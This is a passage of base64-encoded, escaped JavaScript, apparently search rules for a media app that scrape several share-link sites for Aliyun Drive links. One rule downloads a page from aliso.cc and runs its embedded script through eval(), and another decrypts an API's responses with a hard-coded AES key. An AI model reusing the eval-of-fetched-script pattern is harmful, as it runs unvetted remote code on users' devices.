FxcXG4gICAgICAgICAgICAgICAgICAgIG1vZGU6IENyeXB0b0pTLm1vZGUuQ0JDLFxcXFxuICAgICAgICAgICAgICAgICAgICBwYWRkaW5nOiBDcnlwdG9KUy5wYWQuUGtjczdcXFxcbiAgICAgICAgICAgICAgICB9KS50b1N0cmluZyhDcnlwdG9KUy5lbmMuVXRmOCk7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIGVuY3J5cHRlZDtcXFxcbiAgICAgICAgICAgIH1cXFxcblxcXFxuICAgICAgICAgICAgbGV0IGh0bWwgPSByZXF1ZXN0KGlucHV0KTtcXFxcbiAgICAgICAgICAgIGxldCBidXQgPSBwYXJzZURvbShodG1sLCAnLmJ1dHRvbiYmaHJlZicsICdodHRwczovL2FsaXNvLmNjLycpO1xcXFxuICAgICAgICAgICAgLy9sb2coYnV0KTtcXFxcbiAgICAgICAgICAgIGxldCBnb3QgPSByZXF1ZXN0KGJ1dCk7XFxcXG4gICAgICAgICAgICAvL2xvZyhnb3QpO1xcXFxuICAgICAgICAgICAgZXZhbChwYXJzZURvbUZvckh0bWwoZ290LCAnaGVhZCYmc2NyaXB0LDEmJkh0bWwnKSk7XFxcXG4gICAgICAgICAgICByZXR1cm4gZGVjcnkoYmFzZTY0LnNwbGl0KCchJylbMF0pO1xcXFxuICAgICAgICB9XFxcXG4gICAgfSxcXFxcbiAgICB7XFxcXG4gICAgICAgIG5hbWU6IFxcXFxcXFwi5LqR55uY5YiG5Lqr56S+XFxcXFxcXCIsXFxcXG4gICAgICAgIHBhZ2U6IGZhbHNlLFxcXFxuICAgICAgICBmaW5kOiBmdW5jdGlvbihzLCBwYWdlKSB7XFxcXG4gICAgICAgICAgICBsZXQgYWxpVXRpbCA9ICQucmVxdWlyZShcXFxcXFxcImFsaVV0aWxcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBsZXQgQ3J5cHRvSlMgPSBhbGlVdGlsLmdldENyeXB0b0pTKCk7XFxcXG5cXFxcbiAgICAgICAgICAgIGZ1bmN0aW9uIGRlY3J5KHN0cikge1xcXFxuICAgICAgICAgICAgICAgIHZhciBrZXkgPSBDcnlwdG9KUy5lbmMuVXRmOC5wYXJzZShcXFxcXFxcIjVGNkIyQUszM0RBU0QxMjNcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgdmFyIGVuY3J5cHRlZCA9IENyeXB0b0pTLkFFUy5kZWNyeXB0KHN0ciwga2V5LCB7XFxcXG4gICAgICAgICAgICAgICAgICAgIG1vZGU6IENyeXB0b0pTLm1vZGUuRUNCLFxcXFxuICAgICAgICAgICAgICAgICAgICBwYWRkaW5nOiBDcnlwdG9KUy5wYWQuUGtjczdcXFxcbiAgICAgICAgICAgICAgICB9KS50b1N0cmluZyhDcnlwdG9KUy5lbmMuVXRmOCk7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIGVuY3J5cHRlZDtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIGxldCBodG1sID0gcmVxdWVzdCgnaHR0cHM6Ly93d3cueXVucGFuZmVueGlhbmcuY24vYXBpL2Jicy9hcGkvZ2V0ZGF0YT9rZXk9JyArIHMgKyAnJnR5cGU9dmlkZW8nLCB7XFxcXG4gICAgICAgICAgICAgICAgaGVhZGVyczoge1xcXFxuICAgICAgICAgICAgICAgICAgICBcXFxcXFxcIlJlZmVyZXJcXFxcXFxcIjogXFxcXFxcXCJodHRwczovL3d3dy55dW5wYW5mZW54aWFuZy5jbi9cXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgbGV0IGpzb24gPSBkZWNyeShKU09OLnBhcnNlKGh0bWwpLmRhdGEpO1xcXFxuICAgICAgICAgICAgLy9sb2coanNvbik7XFxcXG4gICAgICAgICAgICBsZXQgYXJyID0gSlNPTi5wYXJzZShqc29uKTsgLy9bMF0ucmVzdWx0Lml0ZW1zO1xcXFxuICAgICAgICAgICAgLy9sb2coYXJyKTtcXFxcblxcXFxuICAgICAgICAgICAgbGV0IGQgPSBbXTtcXFxcbiAgICAgICAgICAgIGxldCBiZXQgPSBbXTtcXFxcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgYXJyLmxlbmd0aDsgaSsrKSB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGl0ID0gYXJyW2ldO1xcXFxuICAgICAgICAgICAgICAgIGxldCB1cmwgPSBpdC5waWQ7XFxcXG4gICAgICAgICAgICAgICAgYmV0LnB1c2goe1xcXFxuICAgICAgICAgICAgICAgICAgICB1cmw6ICdodHRwczovL3d3dy55dW5wYW5mZW54aWFuZy5jbi9hcGkvYmJzL2FwaS9nZXRhcnRpY2xlP2lkPScgKyB1cmwsXFxcXG4gICAgICAgICAgICAgICAgICAgIG9wdGlvbnM6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBcXFxcXFxcIlJlZmVyZXJcXFxcXFxcIjogXFxcXFxcXCJodHRwczovL3d3dy55dW5wYW5mZW54aWFuZy5jbi9cXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAvL2xvZyh1KTtcXFxcbiAgICAgICAgICAgIGxldCBiZXRoID0gYmF0Y2hGZXRjaChiZXQpO1xcXFxuXFxcXG4gICAgICAgICAgICAvL2xvZyhhcnRpY2xlKTtcXFxcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgYmV0aC5sZW5ndGg7IGkrKykge1xcXFxuICAgICAgICAgICAgICAgIGxldCBqc29uID0gSlNPTi5wYXJzZShiZXRoW2ldKS5kYXRhO1xcXFxuICAgICAgICAgICAgICAgIC8vbG9nKGpzb24pO1xcXFxuICAgICAgICAgICAgICAgIGxldCBsaXN0ID0ganNvbi5kb3dubG9hZC5zcGxpdCgnQCcpO1xcXFxuICAgICAgICAgICAgICAgIGZvciAobGV0IGogPSAwOyBqIDwgbGlzdC5sZW5ndGg7IGorKykge1xcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgdSA9IGxpc3Rbal07XFxcXG4gICAgICAgICAgICAgICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZToganNvbi50aXRsZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIC8vdXJsOiAnaGlrZXI6Ly9wYWdlL2RldGFpbD9ydWxlPeS6keebmOaxh+W9sSZ1cmw9JyArIHUgKyAnPz9meXBhZ2UnLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgLy91cmw6ICdoaWtlcjovL3BhZ2UvcHVzaD91cmw9aGlrZXI6Ly9lbXB0eSMjJyArIGVuY29kZVVSSUNvbXBvbmVudCh1KSArICc/Pz9meXBhZ2UnLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiAnaHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tL3MvJyArIHUsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBkZXNjOiBqc29uLmNyZWF0ZXRpbWUgKyBcXFxcXFxcIlxcXFxcXFxcblxcXFxcXFwiICsgJ2h0dHBzOi8vd3d3LmFsaXl1bmRyaXZlLmNvbS9zLycgKyB1LFxcXFxuICAgICAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9XFxcXG5cXFxcbiAgICAgICAgICAgIHJldHVybiBkO1xcXFxuICAgICAgICB9XFxcXG4gICAgfSxcXFxcbiAgICB7XFxcXG4gICAgICAgIG5hbWU6IFxcXFxcXFwi55uY5pCcXFxcXFxcXCIsXFxcXG4gICAgICAgIHBhZ2U6IHRydWUsXFxcXG4gICAgICAgIGZpbmQ6IGZ1bmN0aW9uKHMsIHBhZ2UpIHtcXFxcbiAgICAgICAgICAgIHBhZ2UgPSAocGFnZSAtIDEpICogMTA7XFxcXG4gICAgICAgICAgICBsZXQgdXJsID0gXFxcXFxcXCJodHRwczovL3d3dy5wYW5zZWFyY2gubWUvc2VhcmNoP2tleXdvcmQ9XFxcXFxcXCIgKyBzICsgXFxcXFxcXCImb2Zmc2V0PVxcXFxcXFwiICsgcGFnZSArIFxcXFxcXFwiJnBhbj1hbGl5dW5kcml2ZVxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgbGV0IGh0bWwgPSByZXF1ZXN0KHVybCwge30pO1xcXFxuXFxcXG4gICAgICAgICAgICBsZXQgYXJyID0gcGFyc2VEb21Gb3JBcnJheShodG1sLCAnLmdyaWQmJi5zaGFkb3c6aGFzKGFbaHJlZl49aHR0cHM6Ly93d3cuYWxpeXVuZHJpdmUuY29tL3MvXSknKTtcXFxcbiAgICAgICAgICAgIC8vbG9nKGFycik7XFxcXG4gICAgICAgICAgICBsZXQgZCA9IFtdO1xcXFxuICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBhcnIubGVuZ3RoOyBpKyspIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgaXQgPSBhcnJbaV07XFxcXG4gICAgICAgICAgICAgICAgbGV0IHUgPSBwYXJzZURvbUZvckh0bWwoaXQsICdhW2hyZWZePWh0dHBzOi8vd3d3LmFsaXl1bmRyaXZlLmNvbS9zL10mJmhyZWYnKTtcXFxcbiAgICAgICAgICAgICAgICBsZXQgcGljX3VybCA9IHBhcnNlRG9tRm9ySHRtbChpdCwgJ2ltZyYmc3JjJyk7XFxcXG4gICAgICAgICAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IHBhcnNlRG9tRm9ySHRtbChpdCwgJy5icmVhay1hbGwmJlRleHQnKS5zcGxpdCgnaHR0cCcpWzBdLFxcXFxuICAgICAgICAgICAgICAgICAgICBwaWNfdXJsOiBwaWNfdXJsID09PSBcXFxcXFxcIi9mYXZpY29uLnBuZ1xcXFxcXFwiID8gXFxcXFxcXCJodHRwczovL3d3dy5wYW5zZWFyY2gubWUvXFxcXFxcXCIgKyBwaWNfdXJsIDogcGljX3VybCxcXFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiB1LFxcXFxuICAgICAgICAgICAgICAgICAgICBkZXNjOiBwYXJzZURvbUZvckh0bWwoaXQsICdwJiZUZXh0JykgKyBcXFxcXFxcIlxcXFxcXFxcblxcXFxcXFwiICsgdSxcXFxcbiAgICAgICAgICAgICAgICB9KTtcXFxcblxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgcmV0dXJuIGQ7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9LFxcXFxuICAgIHtcXFxcbiAgICAgICAgbmFtZTogXFxcXFxcXCJET1ZY5pCcXFxcXFxcXCIsXFxcXG4gICAgICAgIHBhZ2U6IGZhbHNlLFxcXFxuICAgICAgICBmaW5kOiBmdW5jdGlvbihzLCBwYWdlKSB7XFxcXG4gICAgICAgICAgICBsZXQgdXJsID0gXFxcXFxcXCJodHRwczovL2FwaS5kb3Z4LnRrL2FsaS9zZWFyY2g/d2Q9XFxcXFxcXCIgKyBzO1xcXFxuICAgICAgICAgICAgbGV0IGh0bWwgPSByZXF1ZXN0KHVybCwge30pO1xcXFxuICAgICAgICAgICAgLy9sb2coYmFzZTY0RGVjb2RlKGh0bWwpKTtcXFxcbiAgICAgICAgICAgIGxldCBhcnIgPSBKU09OLnBhcnNlKGh0bWwpLmxpc3Q7XFxcXG4gICAgICAgICAgICAvL2xvZyhhcnIpO1xcXFxuICAgICAgICAgICAgbGV0IGQgPSBbXTtcXFxcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgYXJyLmxlbmd0aDsgaSsrKSB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGl0ID0gYXJyW2ldO1xcXFxuICAgICAgICAgICAgICAgIGxldCB1ID0gaXQudm9kX2NvbnRlbnQ7XFxcXG4gICAgICAgICAgICAgICAgLy91ID0gdS5sZW5ndGggPiAwID8gdVswXSA6IHVybDtcXFxcbiAgICAgICAgICAgICAgICBpZiAoIXUuaW5jbHVkZXMoXFxcXFxcXCJhbGl5dW5kcml2ZVxcXFxcXFwiKSkge1xcXFxuICAgICAgICAgICAgICAgICAgICBjb250aW51ZTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgaWYgKCFjaGVja2FsaSh1KSkge1xcXFxuICAgICAgICAgICAgICAgICAgICBjb250aW51ZTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi4oiaIFxcXFxcXFwiICsgaXQudm9kX25hbWUsXFxcXG4gICAgICAgICAgICAgICAgICAgIHBpY191cmw6IGl0LnZvZF9waWMsXFxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogdSxcXFxcbiAgICAgICAgICAgICAgICAgICAgZGVzYzogXFxcXFxcXCJcXFxcXFxcXG5cXFxcXFxcIiArIHUsXFxcXG4gICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICByZXR1cm4gZDtcXFxcbiAgICAgICAgfVxcXFxuICAgIH0sXFxcXG4gICAge1xcXFxuICAgICAgICBuYW1lOiBcXFxcXFxcIuW/heW6lFxcXFxcXFwiLFxcXFxuICAgICAgICBwYWdlOiB0cnVlLFxcXFxuICAgICAgICBmaW5kOiBmdW5jdGlvbihzLCBwYWdlKSB7XFxcXG4gICAgICAgICAgICBsZXQgdXJsID0gXFxcXFxcXCJodHRwczovL2NuLmJpbmcuY29tL3NlYXJjaD9xPVxcXFxcXFwiICsgcyArIFxcXFxcXFwiK2FsaXl1bmRyaXZlJnFzPWRzJmZvcm09UUJSRVxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgaWYgKHBhZ2UgIT0gMSkge1xcXFxuICAgICAgICAgICAgICAgIHVybCA9IGdldE15VmFyKFxcXFxcXFwiYmluZ1xcXFxcXFwiLCB1cmwpO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgbGV0IGh0bWwgPSByZXF1ZXN0KHVybCwge1xcXFxuICAgICAgICAgICAgICAgIGhlYWRlcnM6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJSZWZlcmVyXFxcXFxcXCI6IFxcXFxcXFwiaHR0cHM6Ly9jbi5iaW5nLmNvbS9cXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgLy9cXFxcXFxcIlgtUmVxdWVzdGVkLVdpdGhcXFxcXFxcIjogXFxcXFxcXCJjb20uZXhhbXBsZS5oaWtlcnZpZXdcXFxcXFxcIixcXFxcbiAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJBY2NlcHRcXFxcXFxcIjogXFxcXFxcXCJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjlcXFxcXFxcIlxcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgbGV0IGFyciA9IHBkZmEoaHRtbCwgXFxcXFxcXCJib2R5JiZhXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgLy9sb2coYXJyKTtcXFxcbiAgICAgICAgICAgIGxldCBkID0gW107XFxcXG4gICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGFyci5sZW5ndGg7IGkrKykge1xcXFxuICAgICAgICAgICAgICAgIGxldCBpdCA9IGFycltpXTtcXFxcbiAgICAgICAgICAgICAgICBsZXQgdSA9IHBkKGl0LCBcXFxcXFxcImEmJmhyZWZcXFxcXFxcIiwgdXJsKTtcXFxcbiAgICAgICAgICAgICAgICBsZXQgdCA9IHBkZmgoaXQsIFxcXFxcXFwiYSYmVGV4dFxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICBpZiAoaXQuaW5jbHVkZXMoXFxcXFxcXCJOZXh0IHBhZ2VcXFxcXFxcIikgfHwgaXQuaW5jbHVkZXMoXFxcXFxcXCLkuIvkuIDpobVcXFxcXFxcIikpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IHUyID0gcGQoaXQsIFxcXFxcXFwiYSYmaHJlZlxcXFxcXFwiLCB1cmwpO1xcXFxuICAgICAgICAgICAgICAgICAgICAvL2xvZyhcXFxcXFxcIm5leHQgcGFnZVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgLy9sb2codTIpO1xcXFxuICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFxcXFxcImJpbmdcXFxcXFxcIiwgdTIpO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICBpZiAodSA9PSBudWxsIHx8IHQgPT0gbnVsbCB8fCAhaXQuaW5jbHVkZXMocykpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgY29udGludWU7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIGlmICghaXQuaW5jbHVkZXMoXFxcXFxcXCLnvZHnm5hcXFxcXFxcIikgJiYgIWl0LmluY2x1ZGVzKFxcXFxcXFwi5LqR55uYXFxcXFxcXCIpICYmXFxcXG4gICAgICAgICAgICAgICAgICAgICFpdC5pbmNsdWRlcyhcXFxcXFxcImFsaXl1bmRyaXZlXFxcXFxcXCIpICYmICFpdC5pbmNsdWRlcyhcXFxcXFxcInl1bnBhblxcXFxcXFwiKSkge1xcXFxuICAgICAgICAgICAgICAgICAgICBjb250aW51ZTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgaWYgKHUuc3RhcnRzV2l0aChcXFxcXFxcImh0dHBzOi8vY24uYmluZy5jb20vXFxcXFxcXCIpKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICBsZXQgZG9tID0gZ2V0SG9tZSh1KS5yZXBsYWNlKFxcXFxcXFwiaHR0cDovL1xcXFxcXFwiLCBcXFxcXFxcIlxcXFxcXFwiKS5yZXBsYWNlKFxcXFxcXFwiaHR0cHM6Ly9cXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgbGV0IF9saW5rcyA9IHQubWF0Y2goL2h0dHBzOlxcXFxcXFxcL1xcXFxcXFxcLyh3d3dcXFxcXFxcXC5hbGl5dW5kcml2ZVxcXFxcXFxcLmNvbVxcXFxcXFxcL3N8YWx5d3BcXFxcXFxcXC5uZXQpXFxcXFxcXFwvXFxcXFxcXFx3Ki9nKSB8fCBbXTtcXFxcbiAgICAgICAgICAgICAgICBsZXQgYyA9IG51bGw7XFxcXG4gICAgICAgICAgICAgICAgaWYgKF9saW5rcy5sZW5ndGggPiAxICYmIF9saW5rc1sxXS5yZXBsYWNlKF9saW5rc1swXSwgXFxcXFxcXCJcXFxcXFxcIikucmVwbGFjZSgvW2EtekEtWjAtOV0rL2csIFxcXFxcXFwiXFxcXFxcXCIpID09IFxcXFxcXFwiXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgYyA9IF9saW5rc1sxXTtcXFxcbiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKF9saW5rcy5sZW5ndGggPiAwKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGMgPSBfbGlua3NbMF07XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiB0LFxcXFxuICAgICAgICAgICAgICAgICAgICBkZXNjOiBkb20sXFxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogYyAhPSBudWxsID8gYyA6IHUsXFxcXG4gICAgICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBsb25nQ2xpY2s6IFt7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi6L+b5YWl572R56uZXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAganM6IEpTT04uc3RyaW5naWZ5KFxcXFxcXFwiaGlrZXI6Ly9wYWdlL3lzZng/d2ViVXJsPVxcXFxcXFwiICsgZW5jb2RlVVJJQ29tcG9uZW50KHUpKVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfV1cXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgcmV0dXJuIGQ7XFxcXG4gICAgICAgIH0sXFxcXG4gICAgICAgIGZpbmRBbGlVcmwoaW5wdXQpIHtcXFxcbiAgICAgICAgICAgIGlmIChpbnB1dC5pbmNsdWRlcyhcXFxcXFxcImFsaXl1bmRyaXZlXFxcXFxcXCIpKSByZXR1cm4gaW5wdXQ7XFxcXG4gICAgICAgICAgICBsZXQgaHRtbCA9IHJlcXVlc3QoaW5wdXQpO1xcXFxuICAgICAgICAgICAgdmFyIF9saW5rcyA9IGh0bWwubWF0Y2goL2h0dHBzOlxcXFxcXFxcL1xcXFxcXFxcLyh3d3dcXFxcXFxcXC5hbGl5dW5kcml2ZVxcXFxcXFxcLmNvbVxcXFxcXFxcL3N8YWx5d3BcXFxcXFxcXC5uZXQpXFxcXFxcXFwvXFxcXFxcXFx3Ki9nKSB8fCBbXTtcXFxcbiAgICAgICAgICAgIGlmIChfbGlua3MubGVuZ3RoID4gMSAmJiBfbGlua3NbMV0ucmVwbGFjZShfbGlua3NbMF0sIFxcXFxcXFwiXFxcXFxcXCIpLnJlcGxhY2UoL1thLXpBLVowLTldKy9nLCBcXFxcXFxcIlxcXFxcXFwiKSA9PSBcXFxcXFxcIlxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIF9saW5rc1sxXTtcXFxcbiAgICAgICAgICAgIH0gZWxzZSBpZiAoX2xpbmtzLmxlbmd0aCA+IDApIHtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gX2xpbmtzWzBdO1xcXFxuICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL3BhZ2UveXNmeD93ZWJVcmw9XFxcXFxcXCIgKyBlbmNvZGVVUklDb21wb25lbnQoaW5wdXQpO1xcXFxuICAgICAgICAgICAgfVxcXFxuXFxcXG4gICAgICAgIH1cXFxcbiAgICB9LFxcXFxuICAgIHtcXFxcbiAgICAgICAgbmFtZTogJ0NDT0YnLFxcXFxuICAgICAgICBwYWdlOiB0cnVlLFxcXFxuICAgICAgICBmaW5kOiBmdW5jdGlvbihzLCBwYWdlKSB7XFxcXG4gICAgICAgICAgICBsZXQgZCA9IFtdXFxcXG4gICAgICAgICAgICBsZXQgYWxpVXRpbCA9ICQucmVxdWlyZShcXFxcXFxcImFsaVV0aWxcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICBsZXQgaHRtbCA9IGZldGNoKCdodHRwczovL3Bhbi5jY29mLmNjL2FwaS9zZWFyY2gnLCB7XFxcXG4gICAgICAgICAgICAgICAgaGVhZGVyczoge1xcXFxuICAgICAgICAgICAgICAgICAgICBcXFxcXFxcImNvbnRlbnQtdHlwZVxcXFxcXFwiOiAnYXBwbGljYXRpb24vanNvbicsXFxcXG4gICAgICAgICAgICAgICAgICAgICdSZWZlcmVyJzogJ2h0dHBzOi8vcGFuLmNjb2YuY2Mvc2VhcmNoP2tleXdvcmQ9JyArIHNcXFxcbiAgICAgICAgICAgICAgICB9LFxcXFxuICAgICAgICAgICAgICAgIGJvZHk6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJwYWdlU2l6ZVxcXFxcXFwiOiAyMCxcXFxcbiAgICAgICAgICAgICAgICAgICAgXFxcXFxcXCJwYWdlTnVtXFxcXFxcXCI6IHBhZ2UsXFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwia2V5d29yZFxcXFxcXFwiOiBzLFxcXFxuICAgICAgICAgICAgICAgICAgICBcXFxcXFxcImZyb21Nb2JpbGVcXFxcXFxcIjogdHJ1ZVxcXFxuICAgICAgICAgICAgICAgIH0sXFxcXG4gICAgICAgICAgICAgICAgbWV0aG9kOiAnUE9TVCdcXFxcbiAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICBsZXQgbGlzdCA9IEpTT04ucGFyc2UoaHRtbClcXFxcbiAgICAgICAgICAgICAgICAuZGF0YS5yb3dzXFxcXG4gICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGxpc3QubGVuZ3RoOyBpKyspIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgaXQgPSBsaXN0W2ldO1xcXFxuICAgICAgICAgICAgICAgIGxldCB0aXRsZSA9IGl0LmZpbGVOYW1lXFxcXG4gICAgICAgICAgICAgICAgbGV0IG11cmwgPSBpdC51cmxcXFxcbiAgICAgICAgICAgICAgICBsZXQgdHlwZSA9IGl0LnR5cGUucmVwbGFjZSgvZm9sZGVyLywgJ+aWh+S7tuWkuScpLnJlcGxhY2UoL2ZpbGUvLCAn5paH5Lu2JylcXFxcbiAgICAgICAgICAgICAgICBpZiAodGl0bGUuaW5jbHVkZXMocykpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiB0aXRsZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGRlc2M6ICfmlofku7bnsbvlnovvvJonICsgdHlwZSArICfvvIzmlofku7blpKflsI/vvJonICsgYWxpVXRpbC5ieXRlc1RvU2l6ZShpdC5zaXplKSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHVybDogbXVybFxcXFxuICAgICAgICAgICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIHJldHVybiBkXFxcXG4gICAgICAgIH1cXFxcbiAgICB9LFxcXFxuICAgIHtcXFxcbiAgICAgICAgbmFtZTogJ+mYv+mHjOWwj+ermScsXFxcXG4gICAgICAgIHBhZ2U6IHRydWUsXFxcXG4gICAgICAgIGZpbmQ6IGZ1bmN0aW9uKHMsIHBhZ2UpIHtcXFxcbiAgICAgICAgICAgIGxldCBob21lID0gXFxcXFxcXCJodHRwczovL3BhbjY2Ni5uZXRcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgIGxldCBkID0gW107XFxcXG4gICAgICAgICAgICBsZXQgaHRtbCA9IHJlcXVlc3QoYnVpbGRVcmwoaG9tZSArIFxcXFxcXFwiL2FwaS9kaXNjdXNzaW9uc1xcXFxcXFwiLCB7XFxcXG4gICAgICAgICAgICAgICAgXFxcXFxcXCJpbmNsdWRlXFxcXFxcXCI6IFxcXFxcXFwidXNlcixsYXN0UG9zdGVkVXNlcixtb3N0UmVsZXZhbnRQb3N0LG1vc3RSZWxldmFudFBvc3QudXNlcix0YWdzLHRhZ3MucGFyZW50LGZpcnN0UG9zdFxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIFxcXFxcXFwiZmlsdGVyW3FdXFxcXFxcXCI6IHMgLyogKyBcXFxcXFxcIiB0YWc6dmlkZW8sY29taWNcXFxcXFxcIiovICxcXFxcbiAgICAgICAgICAgICAgICAvL1xcXFxcXFwiZmlsdGVyW3RhZ11cXFxcXFxcIjogXFxcXFxcXCJ2aWRlbyxjb21pY1xcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgIFxcXFxcXFwicGFnZVtvZmZzZXRdXFxcXFxcXCI6IDIwICogKHBhZ2UgLSAxKVxcXFxuICAgICAgICAgICAgfSksIHtcXFxcbiAgICAgICAgICAgICAgICBoZWFkZXJzOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgIFxcXFxcXFwiY29udGVudC10eXBlXFxcXFxcXCI6IFxcXFxcXFwiYXBwbGljYXRpb24vanNvblxcXFxcXFwiLFxcXFxuICAgICAgICAgICAgICAgICAgICBcXFxcXFxcIlJlZmVyZXJcXFxcXFxcIjogXFxcXFxcXCJodHRwczovL3BhbjY2Ni5uZXQvP3E9XFxcXFxcXCIgKyBzXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICBsZXQgbGlzdCA9IEpTT04ucGFyc2UoaHRtbCkuZGF0YTtcXFxcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbGlzdC5sZW5ndGg7IGkrKykge1xcXFxuICAgICAgICAgICAgICAgIGxldCBpdGVtID0gbGlzdFtpXS5hdHRyaWJ1dGVzO1xcXFxuICAgICAgICAgICAgICAgIGxldCB1cmwgPSBob21lICsgXFxcXFxcXCIvZC9cXFxcXFxcIiArIGl0ZW0uc2x1ZztcXFxcbiAgICAgICAgICAgICAgICBkLnB1